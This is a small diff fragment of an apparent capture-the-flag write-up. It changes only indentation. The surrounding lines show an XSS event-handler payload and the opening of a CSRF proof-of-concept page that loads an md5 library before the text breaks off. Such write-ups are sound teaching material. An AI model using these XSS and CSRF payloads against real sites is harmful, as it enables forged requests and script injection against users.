@@ -22,7 +22,7 @@ just adding some event so the new payload will be `"onmouseenter=alert('flag{THI
     
   The csrf works liken when you open the page it will generate a token and you need to make a request with that generated token. So we've to open a new page in POC or by using iframe.
   ```<html>
-  <html>
+<html>
 <body>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js" integrity="sha512-Hmp6qDy9imQmd15Ds1WQJ3uoyGCUz5myyr5ijainC1z+tP7wuXcze5ZZR3dF7+rkRALfNy7jcfgS5hH8wJ/2dQ==" crossorigin="anonymous"></script>
 <script>
